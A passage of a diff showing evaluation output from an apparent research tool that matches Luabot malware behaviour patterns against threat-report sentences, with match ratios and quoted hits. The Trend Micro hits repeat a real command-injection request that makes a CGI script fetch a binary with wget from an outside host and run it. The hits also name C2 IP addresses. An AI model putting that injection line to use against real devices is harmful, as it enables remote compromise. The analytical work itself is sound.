@@ -1,14 +1,15 @@
-asg_object: {'/proc', '/proc/net/unix', '/proc/\\d+/fd', '^PID.*', '\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}:\\d+', '/proc/net/tcp', '/dev/urandom', '/proc/net/route', '\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}'}
+asg_object: ['/dev/urandom', '/proc', '/proc/\\d+/fd', '/proc/net/route', '/proc/net/tcp', '/proc/net/unix', '0x[0-9a-zA-Z]{1,16}', '\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}', '\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}:\\d+', '^PID.*', '^eth.*', 'port \\d+']
 
 Sample Luabot-ibmcloud.csv
 	num of segment in report: 27, 1 of them contain ASG object(s)
 	lenght of ctd's OPset is 1
+	#numofSTobject: 1, numofSTobject sysRrc: 0
 	#R_malObj
 	num of ctd objects: 4, num of asg objects: 289. R_malObj is 0.0138
-		ctd_object: {'\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}'}
+		ctd_object: ['\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}']
 	#R_malSysObj
 	num of ctd objects: 0, num of asg objects: 0. R_malSysObj is 0.0000
-		len(asg_OPset): 21, len(ctd_OPset): 1
+		len(asg_OPset): 26, len(ctd_OPset): 1
 	#R_malOps
 	num of matched asg op: 0, num of asg op: 349. R_malOps is 0.0000
 		refered lifecycle: []
@@ -17,36 +18,40 @@ Sample Luabot-ibmcloud.csv
 		ref-sys lifecycle: []
 
 Sample Luabot-malwaremustdie.csv
-	num of segment in report: 173, 23 of them contain ASG object(s)
-	lenght of ctd's OPset is 18
+	num of segment in report: 173, 25 of them contain ASG object(s)
+	lenght of ctd's OPset is 21
+	#numofSTobject: 9, numofSTobject sysRrc: 0
 	#R_malObj
-	num of ctd objects: 10, num of asg objects: 289. R_malObj is 0.0346
-		ctd_object: {'/proc/net/unix', '/proc', '^PID.*', '/proc/net/tcp', '/proc/net/route', '\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}'}
+	num of ctd objects: 11, num of asg objects: 289. R_malObj is 0.0381
+		ctd_object: ['/proc', '/proc/net/route', '/proc/net/tcp', '/proc/net/unix', '0x[0-9a-zA-Z]{1,16}', '\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}', '^PID.*']
 	#R_malSysObj
 	num of ctd objects: 0, num of asg objects: 0. R_malSysObj is 0.0000
-		len(asg_OPset): 21, len(ctd_OPset): 18
+		len(asg_OPset): 26, len(ctd_OPset): 21
 	#R_malOps
-	num of matched asg op: 6, num of asg op: 349. R_malOps is 0.0172
-		refered lifecycle: [10, 0, 15, 13]
+	num of matched asg op: 8, num of asg op: 349. R_malOps is 0.0229
+		refered lifecycle: [0, 1, 2, 13, 17, 19]
 	#R_malChangeOps
 	num of matched asg op: 0, num of asg op: 1. R_malChangeOps is 0.0000
 		ref-sys lifecycle: []
 
 	hits
-	<OP11 act=bind(), obj=ip_addr>, <OP18 act=lead, obj=185.14.30.214, sent= Which leads to the different IP addresses from:  185.14.30.214 | anna.me.>
-	<OP 1 act=getpid(), obj=^PID.*>, <OP 3 act=assign, obj=PID, sent=This new first process will assign a PID with gettid & setsid, and then fork() its process one more time to launch the real deal, the malware main process (Noted that the initial process will be dead at this time).>
-	<OP16 act=connect(), obj=ip_addr>, <OP13 act=connect, obj=217.23.3.47, sent= Next, the malware will connect to the CNC in 217.23.3.47 and send an HTTP/1.1 GET command.>
-	<OP14 act=send(), obj=ip_addr>, <OP13 act=connect, obj=217.23.3.47, sent= Next, the malware will connect to the CNC in 217.23.3.47 and send an HTTP/1.1 GET command.>
+	<OP 1 act=set_tid_address(), obj=0x[0-9a-zA-Z]{1,16} (mem)>, <OP13 act=facebook, obj=0x012b73d0, sent= The malware then run test_domain() lua function to load lookup domains: 0x012b7390  0000 0000 726f 6375 676f 6f67 6c65 2e63  ........google.c 0x012b73a0  6f6d 0034 343a 2063 3100 0000 3100 0000  om.44: c1...1... 0x012b73c0  0000 0000 726d 6973 6661 6365 626f 6f6b  ........facebook 0x012b73d0  2e63 6f6d 0000 0000 3100 0000 3100 0000  .com....1...1... 0x012b73f0  0000 0000 c09e 0200 6261 6964 752e 636f  ........baidu.co 0x012b7410  e073 2b01 0402 0000 c1c4 d41a 0a00 0000  .s+............. 0x012b7420  0000 0000 c8af 2c01 616d 617a 6f6e 2e63  ......,.amazon.c 0x012b7430  6f6d 0001 a076 2b01 c040 2b01 e040 2b01  om...v+..@+..@+>
+	<OP 2 act=futex(), obj=0x[0-9a-zA-Z]{1,16} (mem)>, <OP12 act=google.c, obj=0x012b73a0, sent= The malware then run test_domain() lua function to load lookup domains: 0x012b7390  0000 0000 726f 6375 676f 6f67 6c65 2e63  ........google.c 0x012b73a0  6f6d 0034 343a 2063 3100 0000 3100 0000  om.44: c1...1... 0x012b73c0  0000 0000 726d 6973 6661 6365 626f 6f6b  ........facebook 0x012b73d0  2e63 6f6d 0000 0000 3100 0000 3100 0000  .com....1...1... 0x012b73f0  0000 0000 c09e 0200 6261 6964 752e 636f  ........baidu.co 0x012b7410  e073 2b01 0402 0000 c1c4 d41a 0a00 0000  .s+............. 0x012b7420  0000 0000 c8af 2c01 616d 617a 6f6e 2e63  ......,.amazon.c 0x012b7430  6f6d 0001 a076 2b01 c040 2b01 e040 2b01  om...v+..@+..@+>
+	<OP 3 act=getpid(), obj=^PID.*>, <OP 9 act=read, obj=PID, sent=Reading all system's active process names & PID in /proc/{PID}/* with utilizing getidents64 to enumerate them, practically it's an approach to see what's running and what values are actually can be fetch, i.e>
+	<OP14 act=bind(), obj=ip_addr/ip_addr:port/port>, <OP20 act=lead, obj=185.14.30.214, sent= Which leads to the different IP addresses from:  185.14.30.214 | anna.me>
+	<OP18 act=send(), obj=ip_addr/ip_addr:port/port>, <OP18 act=record, obj=217.23.3.47, sent= I recorded this CNC connection session in PCAP with its encrypted form replies from 217.23.3.47 >
+	<OP20 act=connect(), obj=ip_addr/ip_addr:port/port>, <OP16 act=connect, obj=217.23.3.47, sent= Next, the malware will connect to the CNC in 217.23.3.47 and send an HTTP/1.1 GET command>
 
 Sample Luabot-microsoft.csv
 	num of segment in report: 12, 0 of them contain ASG object(s)
 	lenght of ctd's OPset is 0
+	#numofSTobject: 0, numofSTobject sysRrc: 0
 	#R_malObj
 	num of ctd objects: 0, num of asg objects: 289. R_malObj is 0.0000
-		ctd_object: set()
+		ctd_object: []
 	#R_malSysObj
 	num of ctd objects: 0, num of asg objects: 0. R_malSysObj is 0.0000
-		len(asg_OPset): 21, len(ctd_OPset): 0
+		len(asg_OPset): 26, len(ctd_OPset): 0
 	#R_malOps
 	num of matched asg op: 0, num of asg op: 349. R_malOps is 0.0000
 		refered lifecycle: []
@@ -57,12 +62,13 @@ Sample Luabot-microsoft.csv
 Sample Luabot-nj.gov.csv
 	num of segment in report: 11, 0 of them contain ASG object(s)
 	lenght of ctd's OPset is 0
+	#numofSTobject: 0, numofSTobject sysRrc: 0
 	#R_malObj
 	num of ctd objects: 0, num of asg objects: 289. R_malObj is 0.0000
-		ctd_object: set()
+		ctd_object: []
 	#R_malSysObj
 	num of ctd objects: 0, num of asg objects: 0. R_malSysObj is 0.0000
-		len(asg_OPset): 21, len(ctd_OPset): 0
+		len(asg_OPset): 26, len(ctd_OPset): 0
 	#R_malOps
 	num of matched asg op: 0, num of asg op: 349. R_malOps is 0.0000
 		refered lifecycle: []
@@ -73,12 +79,13 @@ Sample Luabot-nj.gov.csv
 Sample Luabot-securityaffairs.csv
 	num of segment in report: 32, 0 of them contain ASG object(s)
 	lenght of ctd's OPset is 0
+	#numofSTobject: 0, numofSTobject sysRrc: 0
 	#R_malObj
 	num of ctd objects: 0, num of asg objects: 289. R_malObj is 0.0000
-		ctd_object: set()
+		ctd_object: []
 	#R_malSysObj
 	num of ctd objects: 0, num of asg objects: 0. R_malSysObj is 0.0000
-		len(asg_OPset): 21, len(ctd_OPset): 0
+		len(asg_OPset): 26, len(ctd_OPset): 0
 	#R_malOps
 	num of matched asg op: 0, num of asg op: 349. R_malOps is 0.0000
 		refered lifecycle: []
@@ -89,12 +96,13 @@ Sample Luabot-securityaffairs.csv
 Sample Luabot-softpedia.csv
 	num of segment in report: 24, 0 of them contain ASG object(s)
 	lenght of ctd's OPset is 0
+	#numofSTobject: 0, numofSTobject sysRrc: 0
 	#R_malObj
 	num of ctd objects: 0, num of asg objects: 289. R_malObj is 0.0000
-		ctd_object: set()
+		ctd_object: []
 	#R_malSysObj
 	num of ctd objects: 0, num of asg objects: 0. R_malSysObj is 0.0000
-		len(asg_OPset): 21, len(ctd_OPset): 0
+		len(asg_OPset): 26, len(ctd_OPset): 0
 	#R_malOps
 	num of matched asg op: 0, num of asg op: 349. R_malOps is 0.0000
 		refered lifecycle: []
@@ -105,47 +113,49 @@ Sample Luabot-softpedia.csv
 Sample Luabot-trendmicro.csv
 	num of segment in report: 35, 2 of them contain ASG object(s)
 	lenght of ctd's OPset is 4
+	#numofSTobject: 2, numofSTobject sysRrc: 0
 	#R_malObj
 	num of ctd objects: 8, num of asg objects: 289. R_malObj is 0.0277
-		ctd_object: {'\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}:\\d+', '\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}'}
+		ctd_object: ['\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}', '\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}:\\d+']
 	#R_malSysObj
 	num of ctd objects: 0, num of asg objects: 0. R_malSysObj is 0.0000
-		len(asg_OPset): 21, len(ctd_OPset): 4
+		len(asg_OPset): 26, len(ctd_OPset): 4
 	#R_malOps
 	num of matched asg op: 4, num of asg op: 349. R_malOps is 0.0115
-		refered lifecycle: [10, 14, 11, 13]
+		refered lifecycle: [13, 14, 17, 18]
 	#R_malChangeOps
 	num of matched asg op: 0, num of asg op: 1. R_malChangeOps is 0.0000
 		ref-sys lifecycle: []
 
 	hits
-	<OP11 act=bind(), obj=ip_addr>, <OP 1 act=send, obj=hxxp://192.154.108.2:8080/Arm1;chmod, sent=A remote attacker sends this request to random IP addresses and attempts to take advantage of the vulnerability:  POST /cgi-bin/supervisor/CloudSetup.cgi?exefile=wget -O /tmp/Arm1 hxxp://192.154.108.2:8080/Arm1;chmod 0777 /tmp/Arm1;/tmp/Arm1; HTTP/1.1>
-	<OP15 act=send(), obj=ip_addr+port>, <OP 2 act=send, obj=hxxp://192.154.108.2:8080/Arm1;chmod, sent=A remote attacker sends this request to random IP addresses and attempts to take advantage of the vulnerability:  POST /cgi-bin/supervisor/CloudSetup.cgi?exefile=wget -O /tmp/Arm1 hxxp://192.154.108.2:8080/Arm1;chmod 0777 /tmp/Arm1;/tmp/Arm1; HTTP/1.1>
-	<OP12 act=bind(), obj=ip_addr+port>, <OP 2 act=send, obj=hxxp://192.154.108.2:8080/Arm1;chmod, sent=A remote attacker sends this request to random IP addresses and attempts to take advantage of the vulnerability:  POST /cgi-bin/supervisor/CloudSetup.cgi?exefile=wget -O /tmp/Arm1 hxxp://192.154.108.2:8080/Arm1;chmod 0777 /tmp/Arm1;/tmp/Arm1; HTTP/1.1>
-	<OP14 act=send(), obj=ip_addr>, <OP 1 act=send, obj=hxxp://192.154.108.2:8080/Arm1;chmod, sent=A remote attacker sends this request to random IP addresses and attempts to take advantage of the vulnerability:  POST /cgi-bin/supervisor/CloudSetup.cgi?exefile=wget -O /tmp/Arm1 hxxp://192.154.108.2:8080/Arm1;chmod 0777 /tmp/Arm1;/tmp/Arm1; HTTP/1.1>
+	<OP14 act=bind(), obj=ip_addr/ip_addr:port/port>, <OP 1 act=send, obj=hxxp://192.154.108.2:8080/Arm1;chmod, sent=A remote attacker sends this request to random IP addresses and attempts to take advantage of the vulnerability:  POST /cgi-bin/supervisor/CloudSetup.cgi?exefile=wget -O /tmp/Arm1 hxxp://192.154.108.2:8080/Arm1;chmod 0777 /tmp/Arm1;/tmp/Arm1; HTTP/1.1>
+	<OP15 act=bind(), obj=ip_addr/ip_addr:port/port>, <OP 2 act=send, obj=hxxp://192.154.108.2:8080/Arm1;chmod, sent=A remote attacker sends this request to random IP addresses and attempts to take advantage of the vulnerability:  POST /cgi-bin/supervisor/CloudSetup.cgi?exefile=wget -O /tmp/Arm1 hxxp://192.154.108.2:8080/Arm1;chmod 0777 /tmp/Arm1;/tmp/Arm1; HTTP/1.1>
+	<OP18 act=send(), obj=ip_addr/ip_addr:port/port>, <OP 1 act=send, obj=hxxp://192.154.108.2:8080/Arm1;chmod, sent=A remote attacker sends this request to random IP addresses and attempts to take advantage of the vulnerability:  POST /cgi-bin/supervisor/CloudSetup.cgi?exefile=wget -O /tmp/Arm1 hxxp://192.154.108.2:8080/Arm1;chmod 0777 /tmp/Arm1;/tmp/Arm1; HTTP/1.1>
+	<OP19 act=send(), obj=ip_addr/ip_addr:port/port>, <OP 2 act=send, obj=hxxp://192.154.108.2:8080/Arm1;chmod, sent=A remote attacker sends this request to random IP addresses and attempts to take advantage of the vulnerability:  POST /cgi-bin/supervisor/CloudSetup.cgi?exefile=wget -O /tmp/Arm1 hxxp://192.154.108.2:8080/Arm1;chmod 0777 /tmp/Arm1;/tmp/Arm1; HTTP/1.1>
 
 Sample Luabot-w00tsec.csv
-	num of segment in report: 82, 10 of them contain ASG object(s)
-	lenght of ctd's OPset is 9
+	num of segment in report: 82, 13 of them contain ASG object(s)
+	lenght of ctd's OPset is 12
+	#numofSTobject: 8, numofSTobject sysRrc: 0
 	#R_malObj
-	num of ctd objects: 12, num of asg objects: 289. R_malObj is 0.0415
-		ctd_object: {'/proc', '^PID.*', '\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}:\\d+', '/dev/urandom', '/proc/net/route', '\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}'}
+	num of ctd objects: 13, num of asg objects: 289. R_malObj is 0.0450
+		ctd_object: ['/dev/urandom', '/proc', '/proc/net/route', '0x[0-9a-zA-Z]{1,16}', '\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}', '\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}:\\d+', '^PID.*']
 	#R_malSysObj
 	num of ctd objects: 0, num of asg objects: 0. R_malSysObj is 0.0000
-		len(asg_OPset): 21, len(ctd_OPset): 9
+		len(asg_OPset): 26, len(ctd_OPset): 12
 	#R_malOps
 	num of matched asg op: 1, num of asg op: 349. R_malOps is 0.0029
-		refered lifecycle: [13]
+		refered lifecycle: [17]
 	#R_malChangeOps
 	num of matched asg op: 0, num of asg op: 1. R_malChangeOps is 0.0000
 		ref-sys lifecycle: []
 
 	hits
-	<OP14 act=send(), obj=ip_addr>, <OP 2 act=know, obj=46.148.18.122, sent=The malicious IP 46.148.18.122 is known for bruteforcing SSH servers and trying to exploit Linksys router command injections in the wild.>
+	<OP18 act=send(), obj=ip_addr/ip_addr:port/port>, <OP 4 act=contact, obj=80.87.205.92, sent=Then the bot will start listening on port 11833 (TCP) and will try to contact the command and control server at 80.87.205.92>
 
 
 OperationPair that changes system resources:
-[<OP19 act=write(), obj=ip_addr+port>, <OP18 act=write(), obj=ip_addr>]
+[<OP22 act=write(), obj=ip_addr/ip_addr:port/port>, <OP23 act=write(), obj=ip_addr/ip_addr:port/port>]
 
 {
     "/dev/urandom": [
